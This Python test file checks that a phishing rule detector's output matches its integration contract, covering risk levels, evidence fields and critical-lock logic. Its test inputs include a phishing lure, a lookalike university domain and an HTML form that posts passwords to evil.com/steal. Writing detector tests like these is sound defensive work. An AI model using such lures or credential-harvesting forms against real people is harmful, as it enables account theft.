"""集成契约验证测试 — 确保后端返回结构与集成契约一致.

这些测试直接验证 integration_contract.md 中定义的每一条契约。
契约中断（breaking change）将导致这些测试失败，提示需要更新 CHANGELOG。
"""

from __future__ import annotations


from phishing_rule_detector.detector import detect

VALID_LEVELS = {"low", "medium", "high", "critical"}
VALID_SEVERITIES = {"low", "medium", "high"}
VALID_GROUPS = {"identity", "credential", "navigation", "social", "transport", "payload"}
VALID_SOURCES = {"raw", "normalized", "ocr", "qr", "attachment", "online"}


def _ok(result: dict) -> dict:
    """辅助：断言 success 并返回 result."""
    assert result["success"] is True, f"应返回 success=true，实际: {result.get('error')}"
    return result


# ── C01: 成功返回顶层结构 ──


class TestContractTopLevel:
    """契约 C01-C02: 顶层返回结构."""

    def test_c01_success_response_has_required_top_level_fields(self):
        """C01: 成功返回 (success=true) 应包含所有必需顶层字段."""
        result = _ok(detect(
            input_text="https://sdu.edu.cn/admissions",
            input_type="url",
        ))

        required = [
            "success", "trace_id", "rule_version", "risk",
            "evidence", "summary", "normalization", "warnings", "duration_ms",
        ]
        for field in required:
            assert field in result, f"顶层缺少必需字段: {field}"

        assert result["success"] is True
        assert isinstance(result["trace_id"], str)
        assert len(result["trace_id"]) == 16
        assert isinstance(result["rule_version"], str)
        assert isinstance(result["risk"], dict)
        assert isinstance(result["evidence"], list)
        assert isinstance(result["summary"], dict)
        assert isinstance(result["normalization"], dict)
        assert isinstance(result["warnings"], list)
        assert isinstance(result["duration_ms"], int)

    def test_c02_error_response_has_code_and_message(self):
        """C02: 失败返回 (success=false) 应包含 error.code 和 error.message."""
        # 空输入触发 EMPTY_INPUT
        result = detect(input_text="   ", input_type="text")

        assert result["success"] is False
        assert "error" in result
        assert "code" in result["error"]
        assert "message" in result["error"]
        assert isinstance(result["error"]["code"], str)
        assert isinstance(result["error"]["message"], str)

    def test_c02b_error_codes_match_contract(self):
        """C02b: 验证所有标准错误码."""
        valid_codes = {
            "EMPTY_INPUT", "INVALID_INPUT_TYPE", "PAYLOAD_TOO_LARGE",
            "INVALID_CONTEXT", "INTERNAL_RULE_ERROR",
        }

        # EMPTY_INPUT
        r1 = detect(input_text="   ", input_type="text")
        assert r1["error"]["code"] in valid_codes

        # INVALID_INPUT_TYPE
        r2 = detect(input_text="test", input_type="invalid_type")
        assert r2["error"]["code"] in valid_codes


# ── C03: RiskResult 契约 ──


class TestContractRiskResult:
    """契约 C03-C05: RiskResult 字段."""

    def test_c03_risk_result_has_all_required_fields(self):
        """C03: RiskResult 应包含所有 6 个必需字段."""
        result = _ok(detect(
            input_text="https://sdu.edu.cn/admissions",
            input_type="url",
        ))
        risk = result["risk"]

        required = ["score", "raw_score", "level", "level_floor", "confidence", "critical_lock"]
        for field in required:
            assert field in risk, f"risk 缺少必需字段: {field}"

        assert isinstance(risk["score"], int)
        assert isinstance(risk["raw_score"], int)
        assert isinstance(risk["level"], str)
        assert isinstance(risk["level_floor"], str)
        assert isinstance(risk["confidence"], float)
        assert isinstance(risk["critical_lock"], bool)

    def test_c04_level_is_valid_risk_level(self):
        """C04: level 必须是 low/medium/high/critical 之一."""
        result = _ok(detect(
            input_text="https://sdu.edu.cn/admissions",
            input_type="url",
        ))
        assert result["risk"]["level"] in VALID_LEVELS

    def test_c05_score_in_valid_range(self):
        """C05: score 和 raw_score 必须在 0–100 范围内."""
        result = _ok(detect(
            input_text="请立即验证您的账号 https://evil.com/login",
            input_type="email",
            context={"sender": "fake@evil.com"},
        ))
        risk = result["risk"]
        assert 0 <= risk["score"] <= 100, f"score={risk['score']} 超出范围"
        assert 0 <= risk["raw_score"] <= 100, f"raw_score={risk['raw_score']} 超出范围"

    def test_c05b_level_floor_not_higher_than_level(self):
        """C05b: level_floor 不应高于 level（下限 ≤ 最终等级）."""
        LEVEL_ORDER = {"low": 1, "medium": 2, "high": 3, "critical": 4}
        # 测试多条案例确保契约成立
        cases = [
            ("https://sdu.edu.cn/admissions", "url", None),
            ("请立即验证账号 https://evil.com/login", "email", {"sender": "fake@evil.com"}),
            ("<form action='https://evil.com/steal'><input type='password'></form>", "html", None),
        ]
        for text, itype, ctx in cases:
            result = _ok(detect(input_text=text, input_type=itype, context=ctx or {}))
            risk = result["risk"]
            assert LEVEL_ORDER[risk["level_floor"]] <= LEVEL_ORDER[risk["level"]], (
                f"level_floor={risk['level_floor']} > level={risk['level']}"
            )


# ── C06: EvidenceItem 契约 ──


class TestContractEvidenceItem:
    """契约 C06-C08: EvidenceItem 字段."""

    def test_c06_evidence_item_has_all_required_fields(self):
        """C06: 每个 EvidenceItem 应包含所有必需字段."""
        result = _ok(detect(
            input_text="请立即验证您的账号 https://evil.com/login",
            input_type="email",
            context={"sender": "fake@evil.com"},
        ))
        # 此案例应产生证据
        evidence = result["evidence"]
        assert len(evidence) > 0, "测试案例应产生至少一条证据"

        for item in evidence:
            required = [
                "rule_id", "title", "group", "severity", "confidence",
                "context_factor", "base_score", "effective_score", "reason",
                "matched_content", "source", "tags", "subject_id",
            ]
            for field in required:
                assert field in item, f"evidence 缺少必需字段: {field}"

            assert isinstance(item["rule_id"], str) and len(item["rule_id"]) > 0
            assert isinstance(item["title"], str)
            assert isinstance(item["group"], str)
            assert isinstance(item["severity"], str)
            assert isinstance(item["confidence"], float)
            assert 0.0 <= item["confidence"] <= 1.0
            assert isinstance(item["context_factor"], float)
            assert 0.0 <= item["context_factor"] <= 1.0
            assert isinstance(item["base_score"], int)
            assert isinstance(item["effective_score"], int)
            assert isinstance(item["reason"], str)
            assert isinstance(item["source"], str)
            assert isinstance(item["tags"], list)

    def test_c07_evidence_group_is_valid(self):
        """C07: evidence.group 必须是 6 个有效组之一."""
        result = _ok(detect(
            input_text="请立即验证您的账号 https://evil.com/login",
            input_type="email",
            context={"sender": "fake@evil.com"},
        ))
        for item in result["evidence"]:
            assert item["group"] in VALID_GROUPS, (
                f"无效的 group: {item['group']} (rule_id={item['rule_id']})"
            )

    def test_c08_evidence_severity_is_valid(self):
        """C08: evidence.severity 必须是 low/medium/high 之一."""
        result = _ok(detect(
            input_text="请立即验证您的账号 https://evil.com/login",
            input_type="email",
            context={"sender": "fake@evil.com"},
        ))
        for item in result["evidence"]:
            assert item["severity"] in VALID_SEVERITIES, (
                f"无效的 severity: {item['severity']} (rule_id={item['rule_id']})"
            )


# ── C09: Summary 契约 ──


class TestContractSummary:
    """契约 C09: Summary 统计."""

    def test_c09_summary_has_required_fields(self):
        """C09: summary 应包含所有必需字段，且值为合理范围."""
        result = _ok(detect(
            input_text="请立即验证您的账号 https://evil.com/login",
            input_type="email",
            context={"sender": "fake@evil.com"},
        ))
        summary = result["summary"]

        required = ["high_count", "medium_count", "low_count", "evidence_groups", "suppressed_count"]
        for field in required:
            assert field in summary, f"summary 缺少必需字段: {field}"

        assert isinstance(summary["high_count"], int) and summary["high_count"] >= 0
        assert isinstance(summary["medium_count"], int) and summary["medium_count"] >= 0
        assert isinstance(summary["low_count"], int) and summary["low_count"] >= 0
        assert isinstance(summary["evidence_groups"], list)
        assert isinstance(summary["suppressed_count"], int) and summary["suppressed_count"] >= 0

        # 计数应自洽
        total_active = (
            summary["high_count"] + summary["medium_count"] + summary["low_count"]
        )
        assert total_active == len(result["evidence"]), (
            f"活跃证据计数不一致: summary 报告 {total_active} 条, evidence 实际 {len(result['evidence'])} 条"
        )


# ── C10: Normalization 契约 ──


class TestContractNormalization:
    """契约 C10: Normalization 信息."""

    def test_c10_normalization_has_required_fields(self):
        """C10: normalization 应包含 operations, input_bytes, input_truncated."""
        result = _ok(detect(
            input_text="https://sdu.edu.cn/admissions",
            input_type="url",
        ))
        norm = result["normalization"]

        assert "operations" in norm
        assert "input_bytes" in norm
        assert "input_truncated" in norm

        assert isinstance(norm["operations"], list)
        assert isinstance(norm["input_bytes"], int) and norm["input_bytes"] >= 0
        assert isinstance(norm["input_truncated"], bool)


# ── C11: critical_lock 契约 ──


class TestContractCriticalLock:
    """契约 C11: critical_lock 语义."""

    def test_c11_critical_lock_ensures_critical_level(self):
        """C11: known-critical case must have critical_lock=True, level=critical, score>=80."""
        result = _ok(detect(
            input_text=(
                "<html><body><form action='https://evil.com/steal'>"
                "<input type='password' name='pwd'><input name='student_id'>"
                "</form></body></html>"
            ),
            input_type="html",
            base_url="https://sdu-edu.cn/login",
        ))

        risk = result["risk"]
        # 此案例必须触发 critical_lock
        assert risk["critical_lock"] is True, (
            f"此案例应触发 critical_lock，实际={risk['critical_lock']}"
        )
        assert risk["level"] == "critical", (
            f"critical_lock=true 但 level={risk['level']}"
        )
        assert risk["score"] >= 80, (
            f"critical_lock=true 但 score={risk['score']} < 80"
        )
        # evidence_groups 必须至少包含 identity 和 credential
        groups = set(e["group"] for e in result["evidence"])
        assert "identity" in groups, f"缺少 identity 组: groups={groups}"
        assert "credential" in groups, f"缺少 credential 组: groups={groups}"
        assert len(groups) >= 2, (
            f"critical_lock 需要至少两个独立证据组，实际: {groups}"
        )

    def test_c11b_high_score_without_critical_lock_stays_high(self):
        """C11b: 只有一组 qualified-high 时 critical_lock=False, level=high."""
        result = _ok(detect(
            input_text=(
                "【紧急】您的账号异常，请立即验证 https://sdu-edu.cn/verify"
            ),
            input_type="email",
            context={"sender": "security@sdu-edu.cn"},
        ))
        risk = result["risk"]
        # 必须明确断言
        assert risk["critical_lock"] is False, (
            f"此案例不应触发 critical_lock，实际={risk['critical_lock']}"
        )
        assert risk["level"] == "high", (
            f"期望 high，实际={risk['level']}"
        )

    def test_c11c_password_form_untrusted_target_group_is_credential(self):
        """C11c: PASSWORD_FORM_UNTRUSTED_TARGET 的 group 为 credential."""
        result = _ok(detect(
            input_text=(
                "<html><body><form action='https://evil.com/steal'>"
                "<input type='password' name='pwd'><input name='student_id'>"
                "</form></body></html>"
            ),
            input_type="html",
            base_url="https://sdu-edu.cn/login",
        ))
        matches = [
            e for e in result["evidence"]
            if e["rule_id"] == "PASSWORD_FORM_UNTRUSTED_TARGET"
        ]
        assert matches, "案例必须触发 PASSWORD_FORM_UNTRUSTED_TARGET"
        assert all(e["group"] == "credential" for e in matches), (
            f"PASSWORD_FORM_UNTRUSTED_TARGET groups="
            f"{[e['group'] for e in matches]}，期望 credential"
        )

    def test_c11d_critical_lock_requires_two_independent_groups(self):
        """C11d: critical_lock 必须来自至少两个独立证据组."""
        result = _ok(detect(
            input_text=(
                "<html><body><form action='https://evil.com/steal'>"
                "<input type='password' name='pwd'><input name='student_id'>"
                "</form></body></html>"
            ),
            input_type="html",
            base_url="https://sdu-edu.cn/login",
        ))
        risk = result["risk"]
        if risk["critical_lock"]:
            # 收集 high severity 且 dc >= 0.80 的证据组
            high_groups: set[str] = set()
            for e in result["evidence"]:
                dc = e["confidence"] * e["context_factor"]
                if e["severity"] == "high" and dc >= 0.80:
                    high_groups.add(e["group"])
            assert len(high_groups) >= 2, (
                f"critical_lock=true 但 qualified-high 组数={len(high_groups)}: {high_groups}"
            )


# ── C12: Debug 模式契约 ──


class TestContractDebugMode:
    """契约 C12: debug 模式."""

    def test_c12_debug_true_returns_suppressed_evidence(self):
        """C12a: debug=true 时返回 suppressed_evidence 字段."""
        result = _ok(detect(
            input_text="请立即验证您的账号 https://evil.com/login",
            input_type="email",
            context={"sender": "fake@evil.com", "debug": True},
        ))
        assert "suppressed_evidence" in result
        assert result["suppressed_evidence"] is not None
        assert isinstance(result["suppressed_evidence"], list)

    def test_c12b_debug_false_no_suppressed_evidence(self):
        """C12b: debug=false 时 suppressed_evidence 为 None 或不存在."""
        result = _ok(detect(
            input_text="请立即验证您的账号 https://evil.com/login",
            input_type="email",
            context={"sender": "fake@evil.com", "debug": False},
        ))
        assert result.get("suppressed_evidence") is None

    def test_c12c_debug_not_set_omits_suppressed_evidence(self):
        """C12c: 不传 debug 时 suppressed_evidence 为 None."""
        result = _ok(detect(
            input_text="https://sdu.edu.cn/admissions",
            input_type="url",
        ))
        assert result.get("suppressed_evidence") is None
